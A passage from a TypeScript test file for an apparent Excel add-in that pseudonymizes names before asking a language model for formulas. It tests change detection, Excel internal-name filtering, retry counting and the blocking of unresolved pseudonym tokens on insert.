    expect(sent.result.wholeColumns).toEqual(["C:C", "A:A", "Orders!$C:$C"]);
  });

  it("a formula inside the selected rows lists none", async () => {
    const { flow } = await setup([SUMIFS_REPLY]);
    const p = flow.prepare("Total Amount for Maria Lopez", "structure_only");
    if (!p.ok) throw new Error(p.message);
    const sent = await flow.send(p.prepared, KEY);
    if (!sent.ok) throw new Error(sent.message);
    expect(sent.result.wholeColumns).toEqual([]);
  });
});

describe("flow: fixes from the independent review and the real-Excel run (2026-09-28)", () => {
  it("names Excel adds for newer functions after an Insert (_xlfn., _xleta.) aren't a change: the next Send goes out", async () => {
    // Seen in Excel for Mac: inserting GROUPBY(..., SUM) adds hidden _xlfn.GROUPBY and _xleta.SUM names.
    const host = fakeHost();
    const names: string[] = ["_xlfn.SUMIFS"];
    host.adapter.listNames = async () => [...names];
    const { flow, model } = await setup([SUMIFS_REPLY, SUMIFS_REPLY], host);
    const p = flow.prepare("Total Amount for Maria Lopez", "structure_only");
    if (!p.ok) throw new Error(p.message);
    const sent = await flow.send(p.prepared, KEY);
    if (!sent.ok) throw new Error(sent.message);
    expect((await flow.insert(sent.result.id, "D2", false)).ok).toBe(true);
    names.push("_xlfn.GROUPBY", "_xleta.SUM", "Orders!_xlnm._FilterDatabase");
    const next = flow.prepare("Total Amount for Ana Ruiz", "structure_only");
    if (!next.ok) throw new Error(next.message);
    expect((await flow.send(next.prepared, KEY)).ok).toBe(true);
    expect(model.bodies).toHaveLength(2);
    expect(flow.getState().stale).toBe(false);
    // A name a formula could use still counts.
    names.push("Rate");
    const third = flow.prepare("Total Amount per Region", "structure_only");
    if (!third.ok) throw new Error(third.message);
    expect(await flow.send(third.prepared, KEY)).toEqual({ ok: false, message: COPY.dataChangedSend });
  });

  it("isExcelInternalName knows Excel's own prefixes, with or without a sheet", () => {
    for (const n of ["_xlfn.GROUPBY", "_xleta.SUM", "_xlpm.x", "_xlws.FILTER", "Orders!_xlnm._FilterDatabase", "_xlnm.Print_Area"]) {
      expect(isExcelInternalName(n)).toBe(true);
    }
    for (const n of ["Rate", "SUM", "xlfn.SUM", "_xlRate", "Orders!Rate"]) expect(isExcelInternalName(n)).toBe(false);
  });

  it("a names or tables read that failed at Refresh isn't a change later, when it works", async () => {
    for (const part of ["names", "tables"] as const) {
      const host = fakeHost();
      let failing = true;
      host.adapter.listNames = async () => {
        if (part === "names" && failing) throw new Error("Excel is busy");
        return [];
      };
      host.adapter.listTables = async () => {
        if (part === "tables" && failing) throw new Error("Excel is busy");
        return [];
      };
      const { flow, model } = await setup([SUMIFS_REPLY], host);
      failing = false;
      const p = flow.prepare("Total Amount for Maria Lopez", "structure_only");
      if (!p.ok) throw new Error(p.message);
      expect((await flow.send(p.prepared, KEY)).ok).toBe(true);
      expect(model.bodies).toHaveLength(1);
    }
  });

  it("no correction is offered when the columns changed while the unreadable reply was on its way", async () => {
    const host = fakeHost();
    const model = fakeModel(["not json"]);
    const flow: Flow = new Flow({
      adapter: host.adapter,
      model: MODEL,
      send: (outbound, key, signal) => {
        flow.setPolicy(0, "B", { note: "Sales region" });
        return model.send(outbound, key, signal);
      },
    });
    expect((await flow.refresh()).ok).toBe(true);
    const p = flow.prepare("Total Amount for Maria Lopez", "structure_only");
    if (!p.ok) throw new Error(p.message);
    const sent = await flow.send(p.prepared, KEY);
    expect(sent).toMatchObject({ ok: false, message: COPY.unreadable });
    expect("correction" in sent).toBe(false);
    expect(flow.history()).toEqual([]);
  });

  it("a correction sent again after a failure is counted once", async () => {
    const host = fakeHost();
    const model = fakeModel(["not json", SUMIFS_REPLY]);
    let calls = 0;
    const flow = new Flow({
      adapter: host.adapter,
      model: MODEL,
      send: (outbound, key, signal) => {
        // The first try of the correction (the second request) fails on the network.
        if (++calls === 2) return Promise.resolve({ ok: false, message: "Couldn't reach openrouter.ai.", latencyMs: 5 });
        return model.send(outbound, key, signal);
      },
    });
    expect((await flow.refresh()).ok).toBe(true);
    const p = flow.prepare("Total Amount for Maria Lopez", "structure_only");
    if (!p.ok) throw new Error(p.message);
    const first = await flow.send(p.prepared, KEY);
    if (first.ok || !first.correction) throw new Error("expected a correction to preview");
    expect(await flow.send(first.correction, KEY)).toMatchObject({ ok: false });
    const again = await flow.send(first.correction, KEY);
    expect(again.ok).toBe(true);
    expect(flow.evalRecords()[0]?.retries).toBe(1);
  });

  it("a formula naming sheet text shaped like a stand-in stays insertable, with a warning", async () => {
    const data = rangeData("Orders", "A1:D5", [
      ["Customer", "Region", "Amount", "Code"],
      ["Maria Lopez", "East", 100, "PERSON_002"],
      ["Ana Ruiz", "West", 200, "PERSON_002"],
      ["Kenji Watanabe", "East", 300, "X"],
      ["Omar Haddad", "East", 400, "X"],
    ]);
    const formula = '=SUMIFS(C2:C5,D2:D5,"PERSON_002")';
    const { flow } = await setup([reply({ kind: "formula", formula, placement: { cell: "F2", fill_down: false }, explanation: "x" })], fakeHost(data));
    // Two stand-ins, so NYMFORM_PERSON_002 exists and PERSON_002 is ambiguous.
    const p = flow.prepare("Total Amount for Maria Lopez and Ana Ruiz", "structure_only");
    if (!p.ok) throw new Error(p.message);
    expect(p.prepared.sentQuestion).toBe("Total Amount for NYMFORM_PERSON_001 and NYMFORM_PERSON_002");
    const sent = await flow.send(p.prepared, KEY);
    if (!sent.ok) throw new Error(sent.message);
    expect(sent.result.unknownTokens).toEqual(["PERSON_002"]);
    expect(sent.result.unresolvedTokens).toEqual([]);
    expect(sent.result.canInsert).toBe(true);
  });

  it("header and lookup-range changes keep a stale session stale", async () => {
    const { flow, host } = await setup([SUMIFS_REPLY]);
    host.ranges["Orders!A1:C7"] = rangeData("Orders", "A1:C7", [["Customer", "Region", "Amount"], ["Zed", "East", 1], ["Ana Ruiz", "West", 2], ["x", "y", 3], ["x", "y", 4], ["x", "y", 5], ["x", "y", 6]]);
    const p = flow.prepare("Total Amount per Region", "structure_only");
    if (!p.ok) throw new Error(p.message);
    expect(await flow.send(p.prepared, KEY)).toEqual({ ok: false, message: COPY.dataChangedSend });
    flow.setHasHeaders(0, false);
    expect(flow.getState().stale).toBe(true);
    expect((await flow.addContextRange("Regions!A1:B5")).ok).toBe(true);
    expect(flow.getState().stale).toBe(true);
    flow.removeContextRange(1);
    expect(flow.getState().stale).toBe(true);
    expect(flow.prepare("Total Amount", "structure_only")).toEqual({ ok: false, message: COPY.dataChanged });
  });

  it("a Refresh while Insert is checking the target stops the write", async () => {
    const host = fakeHost();
    const { flow } = await setup([SUMIFS_REPLY], host);
    const p = flow.prepare("Total Amount for Maria Lopez", "structure_only");
    if (!p.ok) throw new Error(p.message);
    const sent = await flow.send(p.prepared, KEY);
    if (!sent.ok) throw new Error(sent.message);
    host.adapter.isRangeEmpty = async () => {
      await flow.refresh();
      return true;
    };
    expect(await flow.insert(sent.result.id, "D2", false)).toEqual({ ok: false, message: COPY.staleResult });
    expect(host.inserts).toEqual([]);
  });
});

describe("independent review: unknown unprefixed token under collision mode", () => {
  it("blocks a never-issued token that is not workbook text", async () => {
    const data = rangeData("Orders", "A1:D4", [
      ["Customer", "Region", "Amount", "Code"],
      ["Maria Lopez", "East", 100, "PERSON_050"],
      ["Ana Ruiz", "West", 200, "X"],
      ["Kenji Watanabe", "East", 300, "X"],
    ]);
    const { flow, host } = await setup([reply({ kind: "formula", formula: '=SUMIFS(C2:C4,A2:A4,"PERSON_099")', placement: null, explanation: "x" })], fakeHost(data));
    const p = flow.prepare("Total Amount for Maria Lopez", "structure_only");
    if (!p.ok) throw new Error(p.message);
    expect(p.prepared.sentQuestion).toContain("NYMFORM_PERSON_001");
    const sent = await flow.send(p.prepared, KEY);
    if (!sent.ok) throw new Error(sent.message);
    expect(sent.result.canInsert).toBe(false);
    expect(sent.result.unresolvedTokens).toEqual(["PERSON_099"]);
    expect(flow.copyText(sent.result.id)).toBeNull();
    expect(await flow.insert(sent.result.id, "F2", false)).toEqual({ ok: false, message: COPY.insertUnresolved });
    expect(host.inserts).toEqual([]);
  });
});
